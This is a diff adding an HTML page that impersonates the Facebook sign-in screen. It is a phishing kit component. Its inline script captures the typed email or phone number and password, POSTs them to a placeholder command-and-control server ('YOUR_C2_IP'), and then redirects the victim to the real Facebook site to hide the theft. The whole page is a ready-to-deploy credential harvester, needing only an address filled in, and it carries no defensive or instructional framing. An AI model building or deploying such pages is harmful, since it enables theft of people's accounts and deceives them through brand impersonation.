@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook - Sign In</title>
+  <link rel="stylesheet" href="assets/style.css" />
+</head>
+<body>
+  <div class="container">
+    <img src="assets/logo.png" alt="Facebook" class="logo" />
+    <h2>Sign in</h2>
+    <p>Use your Facebook account</p>
+    <form id="loginForm">
+      <input type="text" placeholder="Email or phone" name="u" required />
+      <input type="password" placeholder="Password" name="p" required />
+      <button type="submit">Next</button>
+    </form>
+    <div class="footer">
+      <a href="#">Forgot password?</a>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').onsubmit = async (e) => {
+      e.preventDefault();
+      const u = e.target.u.value;
+      const p = e.target.p.value;
+      await fetch('http://YOUR_C2_IP:5000/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ u, p, page: 'facebook' })
+      });
+      window.location = 'https://www.facebook.com';
+    };
+  </script>
+</body>
+</html>
